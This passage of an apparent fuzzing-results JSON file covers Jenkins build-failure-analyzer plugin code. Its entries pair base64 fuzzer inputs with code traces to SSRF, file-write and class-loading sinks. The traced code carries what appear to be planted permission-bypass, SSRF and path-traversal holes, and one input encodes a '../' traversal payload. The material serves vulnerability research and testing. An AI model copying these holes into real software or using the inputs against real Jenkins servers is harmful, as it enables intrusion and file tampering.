URI(addr))\n243                                   .GET()\n244                                   .build();\n245                               httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());\n246                           }\n247                       } catch (Exception e) {}\n248                       request.getSession(true).setAttribute(SESSION_REMOVED_FAILURE_CAUSE, cause);\n249                   }\n250               } catch (Exception e) {\n251                   //Should we use errorMessage here as well?\n252                   throw (Failure)(new Failure(e.getMessage()).initCause(e));\n253               }\n254           }\n255           response.sendRedirect2(\"./\");\n256       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java:\n192       @Override\n193       public FailureCause removeCause(String id) throws Exception {\n194           FailureCause remove = causes.remove(id);\n195           getPlugin().save();\n196           return remove;\n197       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/MongoDBKnowledgeBase.java:\n323       @Override\n324       public FailureCause removeCause(String id) {\n325           BasicDBObject removedInfo = new BasicDBObject(\"timestamp\", new Date());\n326           removedInfo.put(\"by\", Jenkins.getAuthentication().getName());\n327           BasicDBObject update = new BasicDBObject(\"$set\", new BasicDBObject(\"_removed\", removedInfo));\n328           getJacksonCollection().updateById(id, update);\n329           final FailureCause modifiedFailureCause = getJacksonCollection().findOneById(id);\n330           initCache();\n331           cache.updateCache();\n332           return modifiedFailureCause;\n333       }\n716       MongoClient getMongoConnection() {\n717           if (mongo == null) {\n718               StringBuilder connectionStringBuilder = new StringBuilder(host);\n719               connectionStringBuilder.append(\":\").append(port);\n720               MongoClientSettings.Builder builder = MongoClientSettings.builder().applyToClusterSettings(\n721                       builder1 -> {\n722                           List<ServerAddress> hostlist = new LinkedList<>();\n723                           for (String h: host.split(\",\")) {\n724                               hostlist.add(new ServerAddress(h, port));\n725                           }\n726                           //CS IGNORE AvoidInlineConditionals FOR NEXT 3 LINES. REASON: Split up makes code less readable.\n727                           ClusterConnectionMode mode = hostlist.size() > 1\n728                                   ? ClusterConnectionMode.MULTIPLE\n729                                   : ClusterConnectionMode.SINGLE;\n730                           builder1.hosts(hostlist).\n731                                   serverSelectionTimeout(SERVER_SELECTION_TIMEOUT, TimeUnit.MILLISECONDS).\n732                                   mode(mode);\n733                       }).applyToConnectionPoolSettings(builder15 -> {\n734   \n735                       }).applyToServerSettings(builder12 -> {\n736               }).applyToSocketSettings(builder13 -> builder13.connectTimeout((CONNECT_TIMEOUT), TimeUnit.MILLISECONDS)).\n737                       applyToSslSettings(builder14 -> builder14.enabled(tls)).retryWrites(retryWrites);\n738   \n739               if (password != null && Util.fixEmpty(password.getPlainText()) != null) {\n740                   char[] pwd = password.getPlainText().toCharArray();\n741                   MongoCredential credential = MongoCredential.createCredential(userName, dbName, pwd);\n742                   builder.credential(credential);\n743               }\n744               mongo = MongoClients.create(builder.build());\n745           }\n746           return mongo;\n747       }\n764       private synchronized JacksonMongoCollection<FailureCause> getJacksonCollection() {\n765           if (jacksonCollection == null) {\n766               jacksonCollection = JacksonMongoCollection.builder().withObjectMapper(OBJECT_MAPPER).build(\n767                       getMongoConnection(), dbName, COLLECTION_NAME, FailureCause.class, UuidRepresentation.STANDARD);\n768           }\n769           return jacksonCollection;\n770       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/model/FailureCause.java:\n366       public String getComment() {\n367           return comment;\n368       }\n",
            "cost": 0.677395,
            "harness_id": "id_4",
            "sanitizer": "Server Side Request Forgery (SSRF)",
            "sink": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/CauseManagement.java:245:45",
            "status": "corpus",
            "valid_path": "YES",
            "id": 36
        },
        {
            "blob": [
                "AVcCLi4vLi4vLi4vLi4vLi4vLi4vamF6emVyLXRyYXZlcnNhbABaWGh3Ykc5cGRDMWpiMjUwWlc1MAAA"
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-four/src/main/java/com/aixcc/jenkins/harnesses/four/JenkinsFour.java:\n 78       public static void fuzzerTestOneInput(byte[] data) throws Throwable {\n 79           try {\n 80               new JenkinsFour().fuzz(data);\n 81           } catch (FuzzerSecurityIssueLow | FuzzerSecurityIssueMedium | FuzzerSecurityIssueHigh\n 82                   | FuzzerSecurityIssueCritical e) {\n 83               throw e;\n 84           } catch (Throwable t) {\n 85           }\n 86       }\n 88       public void fuzz(byte[] data) throws Throwable {\n 89           ByteBuffer buffer = ByteBuffer.wrap(data);\n 90           int numRequests = (int) buffer.get();\n 91           if (numRequests < 0)\n 92               return;\n 93   \n 94           RequestImpl requestImpl = null;\n 95           for (int i = 0; i < numRequests; ++i) {\n 96               int command = (int) buffer.get();\n 97               switch (command) {\n 98                   case 5:\n 99                       requestImpl = createHttpRequest(buffer);\n100                       failureCause = causeManagement.getDynamic(requestImpl.getParameter(\"id\"), requestImpl,\n101                               responseImpl);\n102                       failureCause.setId(\"0\");\n103                       break;\n104                   case 19:\n105                       setPermission((int) buffer.get());\n106                       break;\n107                   case 24:\n108                       requestImpl = createHttpRequest(buffer);\n109                       causeManagement.doRemoveConfirm(requestImpl.getParameter(\"id\"), requestImpl, responseImpl);\n110                       break;\n111                   case 33:\n112                       requestImpl = createHttpRequest(buffer);\n113                       knowledgeBaseDescriptor.doSave(requestImpl);\n114                       break;\n115                   case 59:\n116                       requestImpl = createHttpRequest(buffer);\n117                       failureCause.doConfigSubmit(requestImpl, responseImpl);\n118                       break;\n119                   case 63:\n120                       requestImpl = createHttpRequest(buffer);\n121                       knowledgeBaseDescriptor.doLoad(requestImpl);\n122                       break;\n123                   case 87:\n124                       requestImpl = createHttpRequest(buffer);\n125                       knowledgeBaseDescriptor.doForceUpdate(requestImpl);\n126                       break;\n127                   default:\n128                       break;\n129               }\n130           }\n131       }\n133       private String readStringUntilNullByte(ByteBuffer buffer) {\n134           StringBuilder stringBuilder = new StringBuilder();\n135           while (buffer.hasRemaining()) {\n136               byte b = buffer.get();\n137               if (b == 0x00) {\n138                   break;\n139               }\n140               stringBuilder.append((char) b);\n141           }\n142           return stringBuilder.toString();\n143       }\n145       private RequestImpl createHttpRequest(ByteBuffer buffer) throws Throwable {\n146           HttpSession httpSession = Mockito.mock(HttpSession.class);\n147           HttpServletRequest httpRequest = Mockito.mock(HttpServletRequest.class);\n148           RequestImpl requestImpl = spy(new RequestImpl(replacer.stapler, httpRequest, Collections.emptyList(), null));\n149           when(httpRequest.getSession(anyBoolean())).thenReturn(httpSession);\n150           int numParams = (int) buffer.get();\n151           if (numParams > 0) {\n152               for (int i = 0; i < numParams; ++i) {\n153                   String name = readStringUntilNullByte(buffer);\n154                   String value = readStringUntilNullByte(buffer);\n155                   when(httpRequest.getParameter(name)).thenReturn(value);\n156               }\n157           }\n158           String form = readStringUntilNullByte(buffer);\n159           if (form.length() == 0) {\n160               form = \"{}\";\n161           }\n162           // NOTE: Below is to prevent hang from JSONObject.fromObject.\n163           // JSONObject.fromObject has infinite loop vulnerability when a specific value\n164           // is given.\n165           // int startIndex = form.indexOf(\"/*\", 0);\n166           // while (startIndex != -1) {\n167           // int endIndex = form.indexOf(\"*/\", startIndex+2);\n168           // int starIndex = form.indexOf(\"*\", startIndex+2);\n169           // if ((starIndex < endIndex) || (endIndex == -1)) {\n170           // form = \"{}\";\n171           // break;\n172           // }\n173           // if (endIndex == -1) {\n174           // break;\n175           // }\n176           // startIndex = form.indexOf(\"/*\", endIndex+2);\n177           // }\n178           JSONObject formObject = JSONObject.fromObject(form);\n179           doReturn(formObject).when(requestImpl).getSubmittedForm();\n180           return requestImpl;\n181       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java:\n155       public boolean updateForcefully(String id, byte[] data) throws IOException {\n156           Path path = Paths.get(Jenkins.get().getRootDir().toString(), PluginImpl.getStaticResourcesBase(), PATH).resolve(id);\n157           if (!Files.exists(path)) {\n158               return false;\n159           }\n160           Files.write(path, data, StandardOpenOption.TRUNCATE_EXISTING);\n161           return true;\n162       }\n357           @POST\n358           public FormValidation doForceUpdate(StaplerRequest request) {\n359               Jenkins jenkins = Jenkins.get();\n360               boolean permitted = jenkins.hasPermission(Jenkins.ADMINISTER);\n361               boolean hasParams = request.hasParameter(\"id\") && request.hasParameter(\"data\");\n362               if (!permitted && !hasParams) {\n363                   return FormValidation.error(\"Illegal Access\");\n364               }\n365   \n366               LocalFileKnowledgeBase knowledgeBase = (LocalFileKnowledgeBase) PluginImpl.getInstance().getKnowledgeBase();\n367               try {\n368                   if (!knowledgeBase.updateForcefully(request.getParameter(\"id\"),\n369                           Base64.getDecoder().decode(request.getParameter(\"data\")))) {\n370                       return FormValidation.error(\"Failed to update\");\n371                   }\n372               } catch (IOException e) {\n373                   return FormValidation.error(e.getMessage());\n374               }\n375   \n376               return FormValidation.ok();\n377           }\n",
            "cost": 0.53423,
            "harness_id": "id_4",
            "sanitizer": "File read/write hook path",
            "sink": "src/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/db/LocalFileKnowledgeBase.java:160:21",
            "status": "corpus",
            "valid_path": "YES",
            "id": 37
        },
        {
            "blob": [
                ""
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-four/src/main/java/com/aixcc/jenkins/harnesses/four/JenkinsFour.java:\n 78       public static void fuzzerTestOneInput(byte[] data) throws Throwable {\n 79           try {\n 80               new JenkinsFour().fuzz(data);\n 81           } catch (FuzzerSecurityIssueLow | FuzzerSecurityIssueMedium | FuzzerSecurityIssueHigh\n 82                   | FuzzerSecurityIssueCritical e) {\n 83               throw e;\n 84           } catch (Throwable t) {\n 85           }\n 86       }\n 88       public void fuzz(byte[] data) throws Throwable {\n 89           ByteBuffer buffer = ByteBuffer.wrap(data);\n 90           int numRequests = (int) buffer.get();\n 91           if (numRequests < 0)\n 92               return;\n 93   \n 94           RequestImpl requestImpl = null;\n 95           for (int i = 0; i < numRequests; ++i) {\n 96               int command = (int) buffer.get();\n 97               switch (command) {\n 98                   case 5:\n 99                       requestImpl = createHttpRequest(buffer);\n100                       failureCause = causeManagement.getDynamic(requestImpl.getParameter(\"id\"), requestImpl,\n101                               responseImpl);\n102                       failureCause.setId(\"0\");\n103                       break;\n104                   case 19:\n105                       setPermission((int) buffer.get());\n106                       break;\n107                   case 24:\n108                       requestImpl = createHttpRequest(buffer);\n109                       causeManagement.doRemoveConfirm(requestImpl.getParameter(\"id\"), requestImpl, responseImpl);\n110                       break;\n111                   case 33:\n112                       requestImpl = createHttpRequest(buffer);\n113                       knowledgeBaseDescriptor.doSave(requestImpl);\n114                       break;\n115                   case 59:\n116                       requestImpl = createHttpRequest(buffer);\n117                       failureCause.doConfigSubmit(requestImpl, responseImpl);\n118                       break;\n119                   case 63:\n120                       requestImpl = createHttpRequest(buffer);\n121                       knowledgeBaseDescriptor.doLoad(requestImpl);\n122                       break;\n123                   case 87:\n124                       requestImpl = createHttpRequest(buffer);\n125                       knowledgeBaseDescriptor.doForceUpdate(requestImpl);\n126                       break;\n127                   default:\n128                       break;\n129               }\n130           }\n131       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/CauseManagement.java:\n228       public void doRemoveConfirm(@QueryParameter String id, StaplerRequest request, StaplerResponse response)\n229               throws IOException {\n230           boolean hasPermission = Jenkins.getInstance().hasPermission(PluginImpl.REMOVE_PERMISSION);\n231           id = Util.fixEmpty(id);\n232           if (id != null || hasPermission) {\n233               try {\n234                   FailureCause cause = PluginImpl.getInstance().getKnowledgeBase().removeCause(id);\n235                   if (cause != null) {\n236                       try {\n237                           String comment = cause.getComment();\n238                           if (comment.startsWith(\"notice:\")) {\n239                               String addr = comment.substring(comment.indexOf(\":\") + 1);\n240                               HttpClient httpClient = HttpClient.newHttpClient();\n241                               HttpRequest httpRequest = HttpRequest.newBuilder()\n242                                   .uri(new URI(addr))\n243                                   .GET()\n244                                   .build();\n245                               httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());\n246                           }\n247                       } catch (Exception e) {}\n248                       request.getSession(true).setAttribute(SESSION_REMOVED_FAILURE_CAUSE, cause);\n249                   }\n250               } catch (Exception e) {\n251                   //Should we use errorMessage here as well?\n252                   throw (Failure)(new Failure(e.getMessage()).initCause(e));\n253               }\n254           }\n255           response.sendRedirect2(\"./\");\n256       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/PluginImpl.java:\n330       @NonNull\n331       public static PluginImpl getInstance() {\n332           if (instance != null) {\n333               return instance;\n334           }\n335           return ExtensionList.lookup(PluginImpl.class).get(0);\n336       }\n\nsrc/jenkins/core/src/main/java/hudson/ExtensionList.java:\n187       @Override\n188       public T get(int index) {\n189           return ensureLoaded().get(index).getInstance();\n190       }\n312       private List<ExtensionComponent<T>> ensureLoaded() {\n313           if (extensions != null)\n314               return extensions; // already loaded\n315           if (jenkins == null || jenkins.getInitLevel().compareTo(InitMilestone.PLUGINS_PREPARED) < 0)\n316               return legacyInstances; // can't perform the auto discovery until all plugins are loaded, so just make the legacy instances visible\n317   \n318           synchronized (getLoadLock()) {\n319               if (extensions == null) {\n320                   List<ExtensionComponent<T>> r = load();\n321                   r.addAll(legacyInstances);\n322                   extensions = sort(r);\n323               }\n324               return extensions;\n325           }\n326       }\n378       protected List<ExtensionComponent<T>> load() {\n379           LOGGER.fine(() -> String.format(\"Loading ExtensionList '%s'\", extensionType.getName()));\n380           if (LOGGER.isLoggable(Level.FINER)) {\n381               LOGGER.log(Level.FINER, String.format(\"Loading ExtensionList '%s' from\", extensionType.getName()), new Throwable(\"Only present for stacktrace information\"));\n382           }\n383   \n384           return Objects.requireNonNull(jenkins).getPluginManager().getPluginStrategy().findComponents(extensionType, hudson);\n385       }\n\nsrc/jenkins/core/src/main/java/hudson/ClassicPluginStrategy.java:\n321       @Override\n322       public <T> List<ExtensionComponent<T>> findComponents(Class<T> type, Hudson hudson) {\n323   \n324           List<ExtensionFinder> finders;\n325           if (type == ExtensionFinder.class) {\n326               // Avoid infinite recursion of using ExtensionFinders to find ExtensionFinders\n327               finders = List.of(new ExtensionFinder.Sezpoz());\n328           } else {\n329               finders = hudson.getExtensionList(ExtensionFinder.class);\n330           }\n331   \n332           /*\n333            * See ExtensionFinder#scout(Class, Hudson) for the dead lock issue and what this does.\n334            */\n335           if (LOGGER.isLoggable(Level.FINER))\n336               LOGGER.log(Level.FINER, \"Scout-loading ExtensionList: \" + type, new Throwable());\n337           for (ExtensionFinder finder : finders) {\n338               finder.scout(type, hudson);\n339           }\n340   \n341           List<ExtensionComponent<T>> r = new ArrayList<>();\n342           for (ExtensionFinder finder : finders) {\n343               try {\n344                   r.addAll(finder.find(type, hudson));\n345               } catch (AbstractMethodError e) {\n346                   // backward compatibility\n347                   for (T t : finder.findExtensions(type, hudson))\n348                       r.add(new ExtensionComponent<>(t));\n349               }\n350           }\n351   \n352           List<ExtensionComponent<T>> filtered = new ArrayList<>();\n353           for (ExtensionComponent<T> e : r) {\n354               if (ExtensionFilter.isAllowed(type, e))\n355                   filtered.add(e);\n356           }\n357   \n358           return filtered;\n359       }\n\nsrc/jenkins/core/src/main/java/hudson/cli/declarative/CLIRegisterer.java:\n 81       @Override\n 82       public <T> Collection<ExtensionComponent<T>> find(Class<T> type, Hudson jenkins) {\n 83           if (type == CLICommand.class)\n 84               return (List) discover(jenkins);\n 85           else\n 86               return Collections.emptyList();\n 87       }\n101       private List<ExtensionComponent<CLICommand>> discover(@NonNull final Jenkins jenkins) {\n102           LOGGER.fine(\"Listing up @CLIMethod\");\n103           List<ExtensionComponent<CLICommand>> r = new ArrayList<>();\n104   \n105           try {\n106               for (final Method m : Util.filter(Index.list(CLIMethod.class, jenkins.getPluginManager().uberClassLoader), Method.class)) {\n107                   try {\n108                       // command name\n109                       final String name = m.getAnnotation(CLIMethod.class).name();\n110   \n111                       final ResourceBundleHolder res = loadMessageBundle(m);\n112                       res.format(\"CLI.\" + name + \".shortDescription\");   // make sure we have the resource, to fail early\n113   \n114                       r.add(new ExtensionComponent<>(new CloneableCLICommand() {\n115                           @Override\n116                           public String getName() {\n117                               return name;\n118                           }\n119   \n120                           @Override\n121                           public String getShortDescription() {\n122                               // format by using the right locale\n123                               return res.format(\"CLI.\" + name + \".shortDescription\");\n124                           }\n125   \n126                           @Override\n127                           protected CmdLineParser getCmdLineParser() {\n128                               return bindMethod(new ArrayList<>());\n129                           }\n130   \n131                           private CmdLineParser bindMethod(List<MethodBinder> binders) {\n132   \n133                               registerOptionHandlers();\n134                               CmdLineParser parser = new CmdLineParser(null);\n135   \n136                               //  build up the call sequence\n137                               Stack<Method> chains = new Stack<>();\n138                               Method method = m;\n139                               while (true) {\n140                                   chains.push(method);\n141                                   if (Modifier.isStatic(method.getModifiers()))\n142                                       break; // the chain is complete.\n143   \n144                                   // the method in question is an instance method, so we need to resolve the instance by using another resolver\n145                                   Class<?> type = method.getDeclaringClass();\n146                                   try {\n147                                       method = findResolver(type);\n148                                   } catch (IOException ex) {\n149                                       throw new RuntimeException(\"Unable to find the resolver method annotated with @CLIResolver for \" + type, ex);\n150                                   }\n151                                   if (method == null) {\n152                                       throw new RuntimeException(\"Unable to find the resolver method annotated with @CLIResolver for \" + type);\n153                                   }\n154                               }\n155   \n156                               while (!chains.isEmpty())\n157                                   binders.add(new MethodBinder(chains.pop(), this, parser));\n158   \n159                               return parser;\n160                           }\n161   \n162                           /**\n163                            * Envelope an annotated CLI command\n164                            *\n165                            * @param args\n166                            *      Arguments to the sub command. For example, if the CLI is invoked like \"java -jar cli.jar foo bar zot\",\n167                            *      then \"foo\" is the sub-command and the argument list is [\"bar\",\"zot\"].\n168                            * @param locale\n169                            *      Locale of the client (which can be different from that of the server.) Good behaving command implementation\n170                            *      would use this locale for formatting messages.\n171                            * @param stdin\n172                            *      Connected to the stdin of the CLI client.\n173                            * @param stdout\n174                            *      Connected to the stdout of the CLI client.\n175                            * @param stderr\n176                            *      Connected to the stderr of the CLI client.\n177                            * @return\n178                            *      Exit code from the CLI command execution\n179                            *\n180                            *      <p>\n181                            *      Jenkins standard exit codes from CLI:\n182                            *      0 means everything went well.\n183                            *      1 means further unspecified exception is thrown while performing the command.\n184                            *      2 means CmdLineException is thrown while performing the command.\n185                            *      3 means IllegalArgumentException is thrown while performing the command.\n186                            *      4 mean IllegalStateException is thrown while performing the command.\n187                            *      5 means AbortException is thrown while performing the command.\n188                            *      6 means AccessDeniedException is thrown while performing the command.\n189                            *      7 means BadCredentialsException is thrown while performing the command.\n190                            *      8-15 are reserved for future usage\n191                            *      16+ mean a custom CLI exit error code (meaning defined by the CLI command itself)\n192                            *\n193                            *      <p>\n194                            *      Note: For details - see JENKINS-32273\n195                            */\n196                           @Override\n197                           public int main(List<String> args, Locale locale, InputStream stdin, PrintStream stdout, PrintStream stderr) {\n198                               this.stdout = stdout;\n199                               this.stderr = stderr;\n200                               this.locale = locale;\n201   \n202                               List<MethodBinder> binders = new ArrayList<>();\n203   \n204                               CmdLineParser parser = bindMethod(binders);\n205                               try {\n206                                   // TODO this could probably use ACL.as; why is it calling SecurityContext.setAuthentication rather than SecurityContextHolder.setContext?\n207                                   SecurityContext sc = SecurityContextHolder.getContext();\n208                                   Authentication old = sc.getAuthentication();\n209                                   try {\n210                                       // fill up all the binders\n211                                       parser.parseArgument(args);\n212   \n213                                       Authentication auth = getTransportAuthentication2();\n214                                       sc.setAuthentication(auth); // run the CLI with the right credential\n215                                       jenkins.checkPermission(Jenkins.READ);\n216   \n217                                       // resolve them\n218                                       Object instance = null;\n219                                       for (MethodBinder binder : binders)\n220                                           instance = binder.call(instance);\n221   \n222                                       if (instance instanceof Integer)\n223                                           return (Integer) instance;\n224                                       else\n225                                           return 0;\n226                                   } catch (InvocationTargetException e) {\n227                                       Throwable t = e.getTargetException();\n228                                       if (t instanceof Exception)\n229                                           throw (Exception) t;\n230                                       throw e;\n231                                   } finally {\n232                                       sc.setAuthentication(old); // restore\n233                                   }\n234                               } catch (CmdLineException e) {\n235                                   printError(e.getMessage());\n236                                   printUsage(stderr, parser);\n237                                   return 2;\n238                               } catch (IllegalStateException e) {\n239                                   printError(e.getMessage());\n240                                   return 4;\n241                               } catch (IllegalArgumentException e) {\n242                                   printError(e.getMessage());\n243                                   return 3;\n244                               } catch (AbortException e) {\n245                                   printError(e.getMessage());\n246                                   return 5;\n247                               } catch (AccessDeniedException e) {\n248                                   printError(e.getMessage());\n249                                   return 6;\n250                               } catch (BadCredentialsException e) {\n251                                   // to the caller, we can't reveal whether the user didn't exist or the password didn't match.\n252                                   // do that to the server log instead\n253                                   String id = UUID.randomUUID().toString();\n254                                   logAndPrintError(e, \"Bad Credentials. Search the server log for \" + id + \" for more details.\",\n255                                           \"CLI login attempt failed: \" + id, Level.INFO);\n256                                   return 7;\n257                               } catch (Throwable e) {\n258                                   final String errorMsg = \"Unexpected exception occurred while performing \" + getName() + \" command.\";\n259                                   logAndPrintError(e, errorMsg, errorMsg, Level.WARNING);\n260                                   Functions.printStackTrace(e, stderr);\n261                                   return 1;\n262                               }\n263                           }\n264   \n265                           private void printError(String errorMessage) {\n266                               this.stderr.println();\n267                               this.stderr.println(\"ERROR: \" + errorMessage);\n268                           }\n269   \n270                           private void logAndPrintError(Throwable e, String errorMessage, String logMessage, Level logLevel) {\n271                               LOGGER.log(logLevel, logMessage, e);\n272                               printError(errorMessage);\n273                           }\n274   \n275                           @Override\n276                           protected int run() throws Exception {\n277                               throw new UnsupportedOperationException();\n278                           }\n279                       }));\n280                   } catch (ClassNotFoundException | MissingResourceException e) {\n281                       LOGGER.log(SEVERE, \"Failed to process @CLIMethod: \" + m, e);\n282                   }\n283               }\n284           } catch (IOException e) {\n285               LOGGER.log(SEVERE, \"Failed to discover @CLIMethod\", e);\n286           }\n287   \n288           return r;\n289       }\n294       private ResourceBundleHolder loadMessageBundle(Method m) throws ClassNotFoundException {\n295           Class c = m.getDeclaringClass();\n296           Class<?> msg = c.getClassLoader().loadClass(c.getName().substring(0, c.getName().lastIndexOf(\".\")) + \".Messages\");\n297           return ResourceBundleHolder.get(msg);\n298       }\n",
            "cost": 0.09127,
            "harness_id": "id_4",
            "sanitizer": "load arbitrary library",
            "sink": "src/jenkins/core/src/main/java/hudson/cli/declarative/CLIRegisterer.java:296:53",
            "status": "corpus",
            "valid_path": "NO",
            "id": 38
        },
        {
            "blob": [
                ""
            ],
            "code": "src/jenkins-harnesses/jenkins-harness-four/src/main/java/com/aixcc/jenkins/harnesses/four/JenkinsFour.java:\n 78       public static void fuzzerTestOneInput(byte[] data) throws Throwable {\n 79           try {\n 80               new JenkinsFour().fuzz(data);\n 81           } catch (FuzzerSecurityIssueLow | FuzzerSecurityIssueMedium | FuzzerSecurityIssueHigh\n 82                   | FuzzerSecurityIssueCritical e) {\n 83               throw e;\n 84           } catch (Throwable t) {\n 85           }\n 86       }\n 88       public void fuzz(byte[] data) throws Throwable {\n 89           ByteBuffer buffer = ByteBuffer.wrap(data);\n 90           int numRequests = (int) buffer.get();\n 91           if (numRequests < 0)\n 92               return;\n 93   \n 94           RequestImpl requestImpl = null;\n 95           for (int i = 0; i < numRequests; ++i) {\n 96               int command = (int) buffer.get();\n 97               switch (command) {\n 98                   case 5:\n 99                       requestImpl = createHttpRequest(buffer);\n100                       failureCause = causeManagement.getDynamic(requestImpl.getParameter(\"id\"), requestImpl,\n101                               responseImpl);\n102                       failureCause.setId(\"0\");\n103                       break;\n104                   case 19:\n105                       setPermission((int) buffer.get());\n106                       break;\n107                   case 24:\n108                       requestImpl = createHttpRequest(buffer);\n109                       causeManagement.doRemoveConfirm(requestImpl.getParameter(\"id\"), requestImpl, responseImpl);\n110                       break;\n111                   case 33:\n112                       requestImpl = createHttpRequest(buffer);\n113                       knowledgeBaseDescriptor.doSave(requestImpl);\n114                       break;\n115                   case 59:\n116                       requestImpl = createHttpRequest(buffer);\n117                       failureCause.doConfigSubmit(requestImpl, responseImpl);\n118                       break;\n119                   case 63:\n120                       requestImpl = createHttpRequest(buffer);\n121                       knowledgeBaseDescriptor.doLoad(requestImpl);\n122                       break;\n123                   case 87:\n124                       requestImpl = createHttpRequest(buffer);\n125                       knowledgeBaseDescriptor.doForceUpdate(requestImpl);\n126                       break;\n127                   default:\n128                       break;\n129               }\n130           }\n131       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/CauseManagement.java:\n228       public void doRemoveConfirm(@QueryParameter String id, StaplerRequest request, StaplerResponse response)\n229               throws IOException {\n230           boolean hasPermission = Jenkins.getInstance().hasPermission(PluginImpl.REMOVE_PERMISSION);\n231           id = Util.fixEmpty(id);\n232           if (id != null || hasPermission) {\n233               try {\n234                   FailureCause cause = PluginImpl.getInstance().getKnowledgeBase().removeCause(id);\n235                   if (cause != null) {\n236                       try {\n237                           String comment = cause.getComment();\n238                           if (comment.startsWith(\"notice:\")) {\n239                               String addr = comment.substring(comment.indexOf(\":\") + 1);\n240                               HttpClient httpClient = HttpClient.newHttpClient();\n241                               HttpRequest httpRequest = HttpRequest.newBuilder()\n242                                   .uri(new URI(addr))\n243                                   .GET()\n244                                   .build();\n245                               httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());\n246                           }\n247                       } catch (Exception e) {}\n248                       request.getSession(true).setAttribute(SESSION_REMOVED_FAILURE_CAUSE, cause);\n249                   }\n250               } catch (Exception e) {\n251                   //Should we use errorMessage here as well?\n252                   throw (Failure)(new Failure(e.getMessage()).initCause(e));\n253               }\n254           }\n255           response.sendRedirect2(\"./\");\n256       }\n\nsrc/plugins/build-failure-analyzer-plugin/src/main/java/com/sonyericsson/jenkins/plugins/bfa/PluginImpl.java:\n330       @NonNull\n331       public static PluginImpl getInstance() {\n332           if (instance != null) {\n333               return instance;\n334           }\n335           return ExtensionList.lookup(PluginImpl.class).get(0);\n336       }\n\nsrc/jenkins/core/src/main/java/hudson/ExtensionList.java:\n187       @Override\n188       public T get(int index) {\n189           return ensureLoaded().get(index).getInstance();\n190       }\n312       private List<ExtensionComponent<T>> ensureLoaded() {\n313           if (extensions != null)\n314               return extensions; // already loaded\n315           if (jenkins == null || jenkins.getInitLevel().compareTo(InitMilestone.PLUGINS_PREPARED) < 0)\n316               return legacyInstances; // can't perform the auto discovery until all plugins are loaded, so just make the legacy instances visible\n317   \n318           synchronized (getLoadLock()) {\n319               if (extensions == null) {\n320                   List<ExtensionComponent<T>> r = load();\n321                   r.addAll(legacyInstances);\n322                   extensions = sort(r);\n323               }\n324               return extensions;\n325           }\n326       }\n378       protected List<ExtensionComponent<T>> load() {\n379           LOGGER.fine(() -> String.format(\"Loading ExtensionList '%s'\", extensionType.getName()));\n380           if (LOGGER.isLoggable(Level.FINER)) {\n381               LOGGER.log(Level.FINER, String.format(\"Loading ExtensionList '%s' from\", extensionType.getName()), new Throwable(\"Only present for stacktrace information\"));\n382           }\n383   \n384           return Objects.requireNonNull(jenkins).getPluginManager().getPluginStrategy().findComponents(extensionType, hudson);\n385       }\n\nsrc/jenkins/core/src/main/java/hudson/ClassicPluginStrategy.java:\n321       @Override\n322       public <T> List<ExtensionComponent<T>> findComponents(Class<T> type, Hudson hudson) {\n323   \n324           List<ExtensionFinder> finders;\n325           if (type == ExtensionFinder.class) {\n326               // Avoid infinite recursion of using ExtensionFinders to find ExtensionFinders\n327               finders = List.of(new ExtensionFinder.Sezpoz());\n328           } else {\n329               finders = hudson.getExtensionList(ExtensionFinder.class);\n330           }\n331   \n332           /*\n333            * See ExtensionFinder#scout(Class, Hudson) for the dead lock issue and what this does.\n334            */\n335           if (LOGGER.isLoggable(Level.FINER))\n336               LOGGER.log(Level.FINER, \"Scout-loading ExtensionList: \" + type, new Throwable());\n337           for (ExtensionFinder finder : finders) {\n338               finder.scout(type, hudson);\n339           }\n340   \n341           List<ExtensionComponent<T>> r = new ArrayList<>();\n342           for (ExtensionFinder finder : finders) {\n343               try {\n344                   r.addAll(finder.find(type, hudson));\n345               } catch (AbstractMethodError e) {\n346                   // backward compatibility\n347                   for (T t : finder.findExtensions(type, hudson))\n348                       r.add(new ExtensionComponent<>(t));\n349               }\n350           }\n351   \n352           List<ExtensionComponent<T>> filtered = new ArrayList<>();\n353           for (ExtensionComponent<T> e : r) {\n354               if (ExtensionFilter.isAllowed(type, e))\n355                   filtered.add(e);\n356           }\n357   \n358           return filtered;\n359       }\n\nsrc/jenkins/core/src/main/java/hudson/ExtensionFinder.java:\n762           @Override\n763           public void scout(Class extensionType, Hudson hudson) {\n764               for (IndexItem<Extension, Object> item : getIndices()) {\n765                   try {\n766                       // we might end up having multiple threads concurrently calling into element(),\n767                       // but we can't synchronize this --- if we do, the one thread that's supposed to load a class\n768                       // can block while other threads wait for the entry into the element call().\n769                       // looking at the sezpoz code, it should be safe to do so\n770                       Class<?> extType = getClassFromIndex(item);\n771                       // according to JDK-4993813 this is the only way to force class initialization\n772                       Class.forName(extType.getName(), true, extType.getClassLoader());\n773                   } catch (Exception | LinkageError e) {\n774                       LOGGER.log(logLevel(item), \"Failed to scout \" + item.className(), e);\n775                   }\n776               }\n777           }\n",
            "cost": 0.06529,
            "harness_id": "id_4",
            "sanitizer": "load arbitrary library",
            "sink": "src/jenkins/core/src/main/java/hudson/ExtensionFinder.java:772:35",
            "status": "corpus",
            "valid_path": "NO",
            "id": 39
        },
        {
            "blob": [
                "ATsBZm9ybQB7ImlkIjogIjAiLCAibmFtZSI6ICJ0ZXN0IiwgImRlc2NyaXB0aW9uIjogInRlc3QiLCAiaW5kaWNhdGlvbnMiOiBbeyJwYXR0ZXJuIjogIioifV19AA=="
